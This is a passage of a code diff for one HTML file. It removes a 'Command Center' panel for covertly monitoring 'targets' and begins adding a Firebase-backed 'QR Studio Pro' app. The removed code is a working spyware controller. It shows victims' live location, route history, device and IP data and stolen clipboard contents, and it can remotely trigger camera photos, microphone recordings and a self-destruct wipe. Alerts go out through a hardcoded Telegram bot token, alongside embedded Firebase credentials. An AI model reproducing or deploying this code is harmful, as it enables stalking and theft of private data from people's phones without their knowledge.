@@ -1,360 +1,608 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="bn">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Command Center — Admin</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- 🔥 PWA App Meta Tags 🔥 -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#3b82f6">
+    <title>QR Studio Pro</title>
+    
+    <!-- QR Library, Scanner, Confetti & Icons -->
+    <script src="https://cdn.jsdelivr.net/npm/easyqrcodejs@4.4.13/dist/easy.qrcode.min.js"></script>
+    <script src="https://unpkg.com/html5-qrcode"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+
+    <!-- 🔥 Firebase Compat Libraries (For Single HTML File) 🔥 -->
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.1/firebase-analytics-compat.js"></script>
+
     <style>
-        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-        :root { --bg: #060812; --panel: rgba(8, 12, 25, 0.96); --surface: rgba(255, 255, 255, 0.04); --border: rgba(255, 255, 255, 0.07); --border-accent: rgba(56, 189, 248, 0.2); --accent: #38bdf8; --accent2: #818cf8; --green: #10b981; --red: #f43f5e; --orange: #f59e0b; --text: #f1f5f9; --muted: #64748b; --panel-w: 360px; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); overflow: hidden; height: 100vh; width: 100vw; }
-        #map { position: absolute; inset: 0; z-index: 1; }
-        .leaflet-tile-pane { filter: brightness(0.82) saturate(1.15) hue-rotate(5deg); }
-        #showPanelBtn { display: none; position: absolute; top: 16px; left: 16px; z-index: 1000; background: rgba(8,12,25,0.92); color: var(--accent); border: 1px solid var(--border-accent); padding: 10px 16px; border-radius: 10px; cursor: pointer; font-weight: 600; font-size: 13px; backdrop-filter: blur(14px); }
-        .map-hud { position: absolute; bottom: 20px; left: calc(var(--panel-w) + 20px); z-index: 500; display: flex; gap: 10px; }
-        .hud-chip { background: rgba(8,12,25,0.88); border: 1px solid var(--border-accent); border-radius: 8px; padding: 6px 12px; font-size: 11px; color: var(--muted); display: flex; align-items: center; gap: 6px; }
-        .hud-chip .val { color: var(--text); font-weight: 600; font-family: 'Orbitron', monospace; font-size: 12px; }
-        .panel { position: absolute; top: 0; left: 0; width: var(--panel-w); height: 100%; z-index: 900; background: var(--panel); border-right: 1px solid var(--border-accent); backdrop-filter: blur(24px); display: flex; flex-direction: column; overflow: hidden; transition: transform 0.35s; }
-        .panel.hidden { transform: translateX(-100%); }
-        .panel-header { padding: 14px 16px 12px; border-bottom: 1px solid var(--border); background: linear-gradient(180deg, rgba(56,189,248,0.06) 0%, transparent 100%); display:flex; justify-content:space-between; align-items:center;}
-        .panel-brand { font-family: 'Orbitron', sans-serif; font-size: 12px; font-weight: 700; color: var(--accent); display: flex; align-items: center; gap: 8px; }
-        .user-list-wrap { border-bottom: 1px solid var(--border); padding: 10px 12px; background: rgba(0,0,0,0.25); }
-        .user-tabs { display: flex; gap: 6px; flex-wrap: wrap; margin-top:8px;}
-        .user-tab { display: flex; align-items: center; gap: 5px; padding: 5px 8px; border-radius: 8px; cursor: pointer; border: 1px solid var(--border); background: var(--surface); font-size: 11px; color: var(--muted); }
-        .user-tab.active { background: rgba(56,189,248,0.12); border-color: rgba(56,189,248,0.4); color: var(--accent); }
-        .tab-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--red); }
-        .tab-dot.live { background: var(--green); box-shadow: 0 0 6px var(--green); animation: blink 1.5s infinite; }
-        .panel-body { flex: 1; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 10px; }
-        .panel-body::-webkit-scrollbar { width: 3px; } .panel-body::-webkit-scrollbar-thumb { background: var(--border-accent); }
-        .status-row { display: flex; align-items: center; gap: 8px; background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 8px 12px; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); }
-        .status-dot.live { background: var(--green); box-shadow: 0 0 12px var(--green); }
-        .status-text { font-weight: 700; font-size: 12px; color: var(--muted); } .status-text.live { color: var(--green); }
-        .address-box { display: flex; gap: 8px; background: rgba(16,185,129,0.07); border: 1px solid rgba(16,185,129,0.18); border-radius: 10px; padding: 10px 12px; font-size: 12px; color: #cbd5e1; }
-        .section { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 12px; }
-        .section-title { font-size: 9px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 9px; display:flex; gap:5px; align-items:center;}
-        .section-title::after { content:''; flex:1; height:1px; background:var(--border); }
-        .info-row { display: flex; justify-content: space-between; padding: 6px 9px; background: rgba(0,0,0,0.2); border-radius: 7px; font-size: 11.5px; margin-bottom: 4px;}
-        .info-label { color: var(--muted); font-weight: 500; } .info-value { color: var(--text); font-weight: 600; max-width:65%; word-break:break-all; text-align:right;}
-        .move-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; }
-        .move-card { background: rgba(0,0,0,0.3); border-radius: 9px; padding: 9px 6px; text-align: center; border: 1px solid var(--border); }
-        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 7px; } .btn-grid .full { grid-column: 1 / -1; }
-        .action-btn { padding: 9px 10px; border: none; border-radius: 9px; font-size: 11.5px; font-weight: 700; cursor: pointer; color: white; transition: 0.2s; }
-        .action-btn:active { transform: scale(0.95); }
-        .route-log { max-height: 80px; overflow-y: auto; margin-top: 6px; font-size:10px; color:var(--muted); }
-        .media-section { display: none; background: var(--surface); border: 1px dashed var(--border-accent); border-radius: 12px; padding: 12px; }
-        .media-section.visible { display: block; }
-        #toast { position: fixed; bottom: 20px; right: 20px; z-index: 9999; background: rgba(8,12,25,0.96); border: 1px solid var(--border-accent); padding: 11px 16px; border-radius: 11px; font-size: 13px; display: none; color: white;}
-        .clipboard-box { background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 8px; padding: 8px; font-size: 10px; color: #fcd34d; font-family: monospace; white-space: pre-wrap; margin-top: 5px; display:none; max-height:80px; overflow-y:auto;}
-        @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.4} }
+        :root {
+            --bg-body: #eef2f6; --app-bg: #ffffff;
+            --text-main: #1e293b; --text-muted: #64748b;
+            --primary: #3b82f6; --primary-gradient: linear-gradient(135deg, #3b82f6, #6366f1);
+            --gold-gradient: linear-gradient(135deg, #fbbf24, #f59e0b);
+            --input-bg: #f1f5f9; --border: #e2e8f0;
+            --nav-bg: rgba(255, 255, 255, 0.85); --shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+        }
+
+        body.dark-mode {
+            --bg-body: #0f172a; --app-bg: #1e293b;
+            --text-main: #f8fafc; --text-muted: #94a3b8;
+            --input-bg: #0f172a; --border: #334155;
+            --nav-bg: rgba(30, 41, 59, 0.85); --shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        html, body {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            font-family: 'Inter', 'Helvetica Neue', sans-serif;
+            background-color: var(--bg-body); display: flex; justify-content: center; 
+            align-items: center; overflow: hidden; overscroll-behavior-y: none;
+        }
+
+        .app-container {
+            width: 100%; max-width: 420px; height: 100%; max-height: 100dvh;
+            background: var(--app-bg); display: flex; flex-direction: column;
+            position: relative; transition: 0.3s; z-index: 1;
+        }
+
+        @media (min-width: 450px) { 
+            .app-container { height: 95vh; border-radius: 30px; box-shadow: var(--shadow); border: 8px solid var(--bg-body); } 
+        }
+
+        .header {
+            padding: 20px 25px; display: flex; justify-content: space-between; align-items: center;
+            background: var(--nav-bg); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); z-index: 10;
+        }
+        .header h2 { margin: 0; font-size: 20px; color: var(--text-main); font-weight: 700; display: flex; align-items: center; gap: 8px; }
+        
+        .head-actions { display: flex; gap: 8px; align-items: center;}
+        .theme-btn {
+            background: var(--input-bg); border: none; width: 40px; height: 40px;
+            border-radius: 50%; color: var(--text-main); cursor: pointer; display: flex; justify-content: center; align-items: center; transition: 0.2s;
+        }
+        .lang-btn { font-weight: 900; font-size: 13px; color: var(--primary); }
+        .pro-btn { width: auto; padding: 0 15px; font-weight: 700; font-size: 13px; background: var(--gold-gradient); color: white; border-radius: 20px; }
+
+        .main-content { flex: 1; overflow-y: auto; padding: 25px; padding-bottom: 100px; scroll-behavior: smooth; }
+        .main-content::-webkit-scrollbar { display: none; }
+
+        .qr-card { background: var(--app-bg); padding: 20px; border-radius: 24px; display: flex; flex-direction: column; align-items: center; margin-bottom: 25px; border: 1px solid var(--border); }
+        #qr-container { width: 200px; height: 200px; background: white; border-radius: 16px; display: flex; justify-content: center; align-items: center; box-shadow: 0 8px 25px rgba(0,0,0,0.08); padding: 12px; margin-bottom: 20px; }
+
+        .action-btns { display: flex; gap: 10px; width: 100%; }
+        .action-btns button {
+            flex: 1; padding: 12px 5px; border: none; border-radius: 12px; font-size: 13px;
+            font-weight: 700; cursor: pointer; color: white; display: flex; flex-direction: column; 
+            gap: 5px; align-items: center; transition: 0.2s;
+        }
+        .action-btns button:active { transform: scale(0.95); }
+        .btn-copy { background: #64748b; } .btn-share { background: #10b981; } .btn-down { background: var(--primary-gradient); } .btn-open { background: #f59e0b; }
+
+        .view-section { display: none; animation: slideUp 0.4s ease; } .view-section.active { display: block; }
+        
+        label { display: flex; align-items: center; gap: 5px; margin: 0 0 8px 5px; font-size: 13px; font-weight: 600; color: var(--text-muted); }
+        .premium-lock { color: #f59e0b; font-size: 12px; }
+        .input-wrap { margin-bottom: 18px; }
+        input, select, textarea {
+            width: 100%; padding: 14px; background: var(--input-bg); border: 2px solid transparent;
+            color: var(--text-main); border-radius: 14px; outline: none; font-size: 14px; transition: 0.3s;
+        }
+        input:focus, textarea:focus { border-color: var(--primary); background: transparent; }
+        textarea { height: 80px; resize: none; }
+        .color-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; } input[type="color"] { height: 45px; padding: 2px; cursor: pointer; }
+        .switch-wrap { display: flex; align-items: center; gap: 10px; font-size: 14px; color: var(--text-main); font-weight: 600; }
+        input[type="checkbox"] { width: 20px; height: 20px; accent-color: var(--primary); }
+
+        #reader { width: 100%; border-radius: 16px; overflow: hidden; border: 2px solid var(--border); background: #000; }
+        #reader video { object-fit: cover; border-radius: 16px; }
+
+        .bottom-nav { position: absolute; bottom: 0; left: 0; width: 100%; background: var(--nav-bg); backdrop-filter: blur(15px); border-top: 1px solid var(--border); display: flex; overflow-x: auto; padding: 10px; z-index: 20; scroll-snap-type: x mandatory; }
+        .bottom-nav::-webkit-scrollbar { display: none; }
+        .nav-item { background: none; border: none; color: var(--text-muted); padding: 8px 15px; min-width: 75px; display: flex; flex-direction: column; align-items: center; gap: 6px; cursor: pointer; font-size: 11px; font-weight: 600; transition: 0.3s; scroll-snap-align: center; }
+        .nav-item i { font-size: 20px; } .nav-item.active { color: var(--primary); }
+
+        .history-item { background: var(--input-bg); padding: 12px; border-radius: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; border: 1px solid var(--border); }
+        .history-text { overflow: hidden; white-space: nowrap; text-overflow: ellipsis; max-width: 70%; color: var(--text-main); font-size: 14px; font-weight: 600; }
+        .history-type { font-size: 11px; color: var(--primary); background: rgba(59, 130, 246, 0.1); padding: 3px 8px; border-radius: 8px; }
+
+        /* 🔥 Modal Styles for Pro/Login 🔥 */
+        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); backdrop-filter: blur(5px); display: none; justify-content: center; align-items: center; z-index: 1000; }
+        .modal-overlay.active { display: flex; }
+        .modal-box { background: var(--app-bg); width: 90%; max-width: 350px; padding: 25px; border-radius: 24px; text-align: center; box-shadow: 0 15px 50px rgba(0,0,0,0.2); position: relative; border: 1px solid var(--border); }
+        .modal-close { position: absolute; top: 15px; right: 15px; background: none; border: none; font-size: 20px; color: var(--text-muted); cursor: pointer; }
+        .modal-icon { font-size: 40px; color: #f59e0b; margin-bottom: 10px; }
+        .modal-title { font-size: 20px; color: var(--text-main); margin: 0 0 10px 0; font-weight: 800; }
+        .modal-desc { font-size: 14px; color: var(--text-muted); margin-bottom: 20px; line-height: 1.5; }
+        .pro-list { text-align: left; font-size: 13px; color: var(--text-main); margin-bottom: 20px; font-weight: 600;}
+        .pro-list li { margin-bottom: 8px; }
+        .pro-list i { color: #10b981; margin-right: 5px; }
+        .btn-google { background: white; color: #333; border: 1px solid #ccc; width: 100%; padding: 12px; border-radius: 12px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; }
+        .btn-google img { width: 20px; }
+        .payment-box { background: rgba(245, 158, 11, 0.1); padding: 15px; border-radius: 12px; text-align: left; margin-bottom: 15px; border: 1px dashed #f59e0b;}
+
+        #toast { position: fixed; top: 30px; left: 50%; transform: translateX(-50%) scale(0.9); background: var(--text-main); color: var(--bg-body); padding: 12px 25px; border-radius: 30px; font-size: 14px; font-weight: 600; opacity: 0; visibility: hidden; transition: 0.3s; z-index: 2000; }
+        #toast.show { opacity: 1; visibility: visible; transform: translateX(-50%) scale(1); }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
 <body>
-    <div id="map"></div>
-    <div class="map-hud" id="mapHud" style="display:none;">
-        <div class="hud-chip">🌐 <span id="hudIp" class="val">--</span></div>
-        <div class="hud-chip">🔋 <span id="hudBat" class="val">--</span></div>
-        <div class="hud-chip">⚡ <span id="hudSpeed" class="val">0 km/h</span></div>
-    </div>
-    <button id="showPanelBtn" onclick="togglePanel(true)">🛰 Panel</button>
-    <div id="toast"></div>
 
-    <div class="panel" id="mainPanel">
-        <div class="panel-header">
-            <div class="panel-brand">COMMAND CENTER</div>
-            <button onclick="togglePanel(false)" style="background:none;border:none;color:white;cursor:pointer;">✕</button>
-        </div>
-
-        <div class="user-list-wrap">
-            <div style="font-size:9px;color:var(--muted);font-weight:bold;">👥 TARGETS <span id="onlineCount" style="float:right;color:var(--accent);">0 Online</span></div>
-            <div class="user-tabs" id="userTabs"></div>
-        </div>
-
-        <div class="panel-body">
-            <div class="status-row">
-                <div class="status-dot" id="statusDot"></div>
-                <span class="status-text" id="statusText">Target Select করুন</span>
-                <span id="lastSeenTime" style="font-size:10px;color:var(--muted);margin-left:auto;"></span>
-            </div>
-
-            <div class="address-box" id="addressBox">📍 <span id="addressUI">Select Target</span></div>
-
-            <div class="section">
-                <div class="section-title">📱 Device & Network</div>
-                <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="deviceUI">--</span></div>
-                <div class="info-row"><span class="info-label">Battery</span><span class="info-value" style="color:var(--green);" id="batUI">--</span></div>
-                <div class="info-row"><span class="info-label">Network</span><span class="info-value" style="color:var(--accent);" id="netUI">--</span></div>
-                <div class="info-row"><span class="info-label">IP Address</span><span class="info-value" id="ipUI">--</span></div>
-            </div>
-
-            <div class="section">
-                <div class="section-title">📋 Stealer Data</div>
-                <div class="info-row" style="margin-bottom:0;"><span class="info-label">Clipboard</span><span class="info-value" id="clipTimeUI" style="font-size:9px;">Waiting...</span></div>
-                <div class="clipboard-box" id="clipboardData"></div>
-            </div>
-
-            <div class="section">
-                <div class="section-title">🚀 Movement</div>
-                <div class="move-grid">
-                    <div class="move-card"><div id="speedUI" style="color:var(--accent);font-weight:bold;font-size:16px;">0</div><div style="font-size:9px;color:var(--muted);">km/h</div></div>
-                    <div class="move-card"><div id="headingUI" style="color:var(--accent);font-weight:bold;font-size:16px;">0°</div><div style="font-size:9px;color:var(--muted);">Heading</div></div>
-                    <div class="move-card"><div id="pointsUI" style="color:var(--accent);font-weight:bold;font-size:16px;">0</div><div style="font-size:9px;color:var(--muted);">Points</div></div>
-                </div>
-            </div>
-
-            <div class="section">
-                <div class="section-title">🗺 Route Logs & Playback</div>
-                <div class="route-log" id="routeLog">No route data yet</div>
-                <div class="btn-grid" style="margin-top:8px;">
-                    <button class="action-btn" style="background:#0ea5e9;" id="playRouteBtn">▶ Play Route</button>
-                    <button class="action-btn" style="background:#475569;" id="clearRouteBtn">🗑 Clear Line</button>
-                </div>
-            </div>
-
-            <div class="section">
-                <div class="section-title">🎮 Remote Commands</div>
-                <div class="btn-grid">
-                    <button class="action-btn" style="background:#8b5cf6;" id="photoFrontBtn">📸 Front Cam</button>
-                    <button class="action-btn" style="background:#6366f1;" id="photoBackBtn">📸 Back Cam</button>
-                    <button class="action-btn" style="background:#ec4899;" id="audioBtn">🎙 Record Mic</button>
-                    <button class="action-btn" style="background:#f59e0b;" id="geoBtn">🛡 Geofence</button>
-                    <button class="action-btn full" style="background:#ef4444;" id="destructBtn">💀 SELF DESTRUCT</button>
-                </div>
-            </div>
-
-            <!-- Photo & Audio Boxes -->
-            <div class="media-section" id="photoBox">
-                <div style="font-size:10px;font-weight:bold;color:var(--muted);margin-bottom:6px;">📷 Captured Photo</div>
-                <img id="spyImg" style="width:100%;border-radius:6px;display:none;">
-                <a id="downloadPhoto" class="action-btn" style="display:none;background:#10b981;text-align:center;text-decoration:none;margin-top:6px;padding:6px;">💾 Save</a>
-            </div>
-            <div class="media-section" id="audioBox">
-                <div style="font-size:10px;font-weight:bold;color:var(--muted);margin-bottom:6px;">🎙 Captured Audio</div>
-                <audio id="spyAudio" controls style="width:100%;display:none;"></audio>
-                <a id="downloadAudio" class="action-btn" style="display:none;background:#10b981;text-align:center;text-decoration:none;margin-top:6px;padding:6px;">💾 Save</a>
-            </div>
-
+<div class="app-container">
+    <div class="header">
+        <h2><i class="fa-solid fa-qrcode" style="color: var(--primary)"></i> <span data-i18n="title">QR Studio</span></h2>
+        <div class="head-actions">
+            <button class="theme-btn lang-btn" onclick="toggleLang()" id="lang-btn">EN</button>
+            <button class="theme-btn" onclick="toggleTheme()"><i class="fa-solid fa-moon" id="theme-icon"></i></button>
+            <!-- 👑 Premium User Button -->
+            <button class="theme-btn pro-btn" id="pro-btn" onclick="openModal()"><i class="fa-solid fa-crown"></i> PRO</button>
         </div>
     </div>
 
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script type="module">
-        // ═══════════════════════════════════════════════════════════
-        //  TELEGRAM BOT CONFIGURATION (Alerts)
-        // ═══════════════════════════════════════════════════════════
-        const TG_BOT_TOKEN = "8714929705:AAHlMoufIMbIZFNdPrSYt_cQRhdW-4Uif84";
-        const TG_CHAT_ID = "YOUR_CHAT_ID"; // <---- এখানে আপনার টেলিগ্রাম চ্যাট আইডি দিন
-
-        function sendTelegramAlert(msg) {
-            if (TG_CHAT_ID === "YOUR_CHAT_ID") return; // Chat ID না থাকলে কাজ করবে না
-            fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`)
-                .catch(() => console.log('TG Send Failed'));
-        }
-
-        // Firebase Init
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
-        import { getDatabase, ref, onValue, set, remove } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
-        const app = initializeApp({ apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" });
-        const db = getDatabase(app);
-
-        // Map Setup
-        const map = L.map('map', { zoomControl: false }).setView([23.8103, 90.4125], 6);
-        L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains:['mt0','mt1','mt2','mt3'] }).addTo(map);
-
-        let markers = {}, routeLines = {}, currentData = {}, activeTagId = null;
-        let geofenceOn = false, geofenceCircle = null, geofenceCenter = null, geoAlertSent = false;
-        let playbackMarker = null;
-
-        // Alerts state memory
-        let lastTgState = {}; // { tagId: { batAlert: boolean, offlineAlert: boolean } }
-
-        window.togglePanel = (show) => {
-            document.getElementById('mainPanel').classList.toggle('hidden', !show);
-            document.getElementById('showPanelBtn').style.display = show ? 'none' : 'block';
-        };
-        const toast = (m) => { const e=document.getElementById('toast'); e.textContent=m; e.style.display='block'; setTimeout(()=>e.style.display='none',3000); }
-
-        function timeAgo(ts) {
-            const s = Math.floor((Date.now() - ts)/1000);
-            if(s<60) return `${s}s ago`; if(s<3600) return `${Math.floor(s/60)}m ago`; return `${Math.floor(s/3600)}h ago`;
-        }
-
-        async function fetchAddress(lat, lng) {
-            try {
-                const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`);
-                const d = await r.json();
-                document.getElementById('addressUI').textContent = d.display_name || 'Unknown';
-            } catch {}
-        }
-
-        function renderPanel(tagId) {
-            const data = currentData[tagId]; if (!data) return;
-            document.getElementById('statusDot').className = `status-dot ${data.isOnline?'live':'offline'}`;
-            document.getElementById('statusText').textContent = data.isOnline ? 'Live ●' : 'Offline';
-            document.getElementById('statusText').style.color = data.isOnline ? 'var(--green)' : 'var(--red)';
-            document.getElementById('lastSeenTime').textContent = data.lastSeen ? timeAgo(data.lastSeen) : '';
-            
-            document.getElementById('deviceUI').textContent = data.deviceInfo || '--';
-            document.getElementById('batUI').textContent = data.battery ? `${data.battery}% ${data.charging?'⚡':''}` : '--';
-            document.getElementById('netUI').textContent = data.networkType || 'Unknown';
-            document.getElementById('ipUI').textContent = data.ip_address || '--';
-            
-            if (data.latitude && data.longitude) {
-                document.getElementById('speedUI').textContent = data.speed || 0;
-                document.getElementById('headingUI').textContent = `${Math.round(data.heading || 0)}°`;
-                map.panTo([data.latitude, data.longitude]);
-                fetchAddress(data.latitude, data.longitude);
-            }
-        }
-
-        // Main DB Listener
-        onValue(ref(db, 'live_location/users'), (snap) => {
-            const usersData = snap.val() || {};
-            currentData = usersData;
-
-            // Render Tabs
-            const tabsEl = document.getElementById('userTabs'); tabsEl.innerHTML = '';
-            let onCount = 0;
-            Object.keys(usersData).forEach(tId => {
-                const d = usersData[tId]; if(d.isOnline) onCount++;
-                const tab = document.createElement('div');
-                tab.className = `user-tab ${tId===activeTagId?'active':''}`;
-                tab.innerHTML = `<div class="tab-dot ${d.isOnline?'live':''}"></div>#${tId.replace('tag','')} ${d.deviceInfo?.split(' ')[0]||''}`;
-                tab.onclick = () => { activeTagId = tId; renderPanel(tId); document.querySelectorAll('.user-tab').forEach(t=>t.classList.remove('active')); tab.classList.add('active'); };
-                tabsEl.appendChild(tab);
-
-                // Telegram Alert Logic (Background monitoring)
-                if (!lastTgState[tId]) lastTgState[tId] = {};
-                if (d.battery <= 15 && !d.charging && !lastTgState[tId].batAlert) {
-                    sendTelegramAlert(`🔋 Battery Low: Target #${tId.replace('tag','')} is at ${d.battery}%`);
-                    lastTgState[tId].batAlert = true;
-                } else if (d.battery > 20 || d.charging) { lastTgState[tId].batAlert = false; }
-
-                if (!d.isOnline && lastTgState[tId].isOnline) {
-                    sendTelegramAlert(`🔴 Offline: Target #${tId.replace('tag','')} went offline!`);
-                } else if (d.isOnline && !lastTgState[tId].isOnline) {
-                    sendTelegramAlert(`🟢 Online: Target #${tId.replace('tag','')} is back online!`);
-                }
-                lastTgState[tId].isOnline = d.isOnline;
-
-                // Geofence check
-                if (geofenceOn && tId === activeTagId && geofenceCenter && d.latitude) {
-                    const dist = map.distance([d.latitude, d.longitude], geofenceCenter);
-                    if (dist > 200 && !geoAlertSent) {
-                        geoAlertSent = true;
-                        sendTelegramAlert(`🚨 Geofence Breach: Target #${tId.replace('tag','')} left the safe zone! Dist: ${Math.round(dist)}m`);
-                        toast("🚨 GEOFENCE BREACHED!");
-                    } else if (dist < 180) { geoAlertSent = false; }
-                }
-
-                // Map Marker Update
-                if (d.latitude && d.longitude) {
-                    const latlng = [d.latitude, d.longitude];
-                    const icon = L.divIcon({ html: `<div style="font-size:24px;">🚗</div>`, className: '' });
-                    if (!markers[tId]) {
-                        markers[tId] = L.marker(latlng, {icon}).addTo(map);
-                        routeLines[tId] = L.polyline([], {color:'#38bdf8', weight:3}).addTo(map);
-                    } else { markers[tId].setLatLng(latlng); }
-                }
-            });
-            document.getElementById('onlineCount').textContent = `${onCount} Online`;
-            if(!activeTagId && Object.keys(usersData).length>0) { activeTagId = Object.keys(usersData)[0]; renderPanel(activeTagId); }
-            if(activeTagId) renderPanel(activeTagId);
-        });
-
-        // Specific Data Listeners (Clipboard, Route, Media)
-        onValue(ref(db, 'live_location/users'), (snap) => {
-            if(!activeTagId) return;
-            const d = snap.val()?.[activeTagId]; if(!d) return;
-
-            // Clipboard
-            if (d.clipboard?.text) {
-                document.getElementById('clipboardData').style.display = 'block';
-                document.getElementById('clipboardData').textContent = d.clipboard.text;
-                document.getElementById('clipTimeUI').textContent = new Date(d.clipboard.time).toLocaleTimeString();
-            }
-
-            // Route History Load
-            if (d.routeHistory && routeLines[activeTagId]) {
-                const pts = Object.values(d.routeHistory).sort((a,b)=>a.ts-b.ts);
-                routeLines[activeTagId].setLatLngs(pts.map(p=>[p.lat, p.lng]));
-                document.getElementById('pointsUI').textContent = pts.length;
-                document.getElementById('routeLog').innerHTML = `Saved ${pts.length} path points.`;
-            }
-
-            // Media
-            if(d.photo?.image) {
-                document.getElementById('photoBox').classList.add('visible');
-                document.getElementById('spyImg').src = d.photo.image; document.getElementById('spyImg').style.display='block';
-                document.getElementById('downloadPhoto').href = d.photo.image; document.getElementById('downloadPhoto').style.display='block';
-            }
-            if(d.audio?.file) {
-                document.getElementById('audioBox').classList.add('visible');
-                document.getElementById('spyAudio').src = d.audio.file; document.getElementById('spyAudio').style.display='block';
-                document.getElementById('downloadAudio').href = d.audio.file; document.getElementById('downloadAudio').style.display='block';
-            }
-        });
-
-        // ═══════════════════════════════════════════════════════════
-        //  REMOTE COMMANDS
-        // ═══════════════════════════════════════════════════════════
-        const sendCmd = (obj) => { if(activeTagId) set(ref(db, `live_location/users/${activeTagId}/command`), obj); else toast('Select Target!'); }
+    <div class="main-content">
         
-        document.getElementById('photoFrontBtn').onclick = () => { sendCmd({ photoTime: Date.now(), camType: 'user' }); toast('Front Cam Request Sent!'); };
-        document.getElementById('photoBackBtn').onclick = () => { sendCmd({ photoTime: Date.now(), camType: 'environment' }); toast('Back Cam Request Sent!'); };
-        document.getElementById('audioBtn').onclick = () => { sendCmd({ audioTime: Date.now(), audioDuration: 8000 }); toast('8s Mic Record Sent!'); };
-        
-        // SELF DESTRUCT
-        document.getElementById('destructBtn').onclick = () => {
-            if(confirm("⚠️ ARE YOU SURE? This will permanently delete the app and data from the target's phone!")) {
-                sendCmd({ destructTime: Date.now() });
-                toast('💀 Self Destruct Activated!');
-            }
-        };
+        <div class="qr-card" id="qr-card">
+            <div id="qr-container"><i class="fa-solid fa-qrcode" style="font-size: 70px; color: #cbd5e1;"></i></div>
+            <div class="action-btns" id="action-btns" style="display: none;">
+                <button class="btn-copy" onclick="copyQR()"><i class="fa-solid fa-copy"></i> <span data-i18n="btn_copy">কপি</span></button>
+                <button class="btn-share" onclick="shareQR()"><i class="fa-solid fa-share-nodes"></i> <span data-i18n="btn_share">শেয়ার</span></button>
+                <button class="btn-down" onclick="downloadQR()"><i class="fa-solid fa-download"></i> <span data-i18n="btn_down">সেভ HD</span></button>
+            </div>
+        </div>
 
-        // Geofence
-        document.getElementById('geoBtn').onclick = () => {
-            geofenceOn = !geofenceOn;
-            if(geofenceOn && activeTagId && currentData[activeTagId]?.latitude) {
-                geofenceCenter = [currentData[activeTagId].latitude, currentData[activeTagId].longitude];
-                geofenceCircle = L.circle(geofenceCenter, {radius:200, color:'#f59e0b', fillOpacity:0.1}).addTo(map);
-                document.getElementById('geoBtn').textContent = '🛡 Geofence ON (200m)';
-                document.getElementById('geoBtn').style.background = '#10b981';
-                toast('Geofence Activated');
-            } else {
-                if(geofenceCircle) map.removeLayer(geofenceCircle);
-                document.getElementById('geoBtn').textContent = '🛡 Geofence';
-                document.getElementById('geoBtn').style.background = '#f59e0b';
-            }
-        };
+        <div id="view-text" class="view-section active">
+            <div class="input-wrap"><label data-i18n="lbl_text">টেক্সট বা লিংক দিন</label><input type="text" id="inp-text" data-i18n-ph="ph_text" placeholder="https://..." oninput="autoGenerate()"></div>
+        </div>
 
-        // Route Playback Animation
-        document.getElementById('playRouteBtn').onclick = async () => {
-            if(!activeTagId || !currentData[activeTagId]?.routeHistory) return toast('No route history found!');
-            const pts = Object.values(currentData[activeTagId].routeHistory).sort((a,b)=>a.ts-b.ts);
-            if(pts.length < 2) return toast('Not enough points to play.');
+        <div id="view-whatsapp" class="view-section">
